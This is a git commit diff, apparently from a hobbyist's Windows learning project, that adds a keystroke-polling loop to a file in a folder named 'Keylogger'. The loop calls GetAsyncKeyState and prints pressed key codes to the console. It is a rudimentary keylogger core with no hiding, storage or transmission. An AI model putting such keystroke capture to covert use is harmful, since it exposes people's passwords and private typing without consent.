3fea029f8d8c44fbf06b51a6407144e2c293323c
BlueNet <yerko.barcelona1920@gmail.com>
2018-08-27 06:40:10 -0400

    probando win32

--- Divirtiendome/Keylogger/main.cpp
+++ Divirtiendome/Keylogger/main.cpp
@@ -1,9 +1,18 @@
 #include <iostream>
+#include <windows.h>
+
 
 using namespace std;
 
 int main()
 {
     cout << "Hello world!" << endl;
+    while(true){
+        for(int i = 8; i < 256 ; i++){
+            if(GetAsyncKeyState(i) == -32767){
+                cout<<i<<endl;
+            }
+        }
+    }
     return 0;
 }
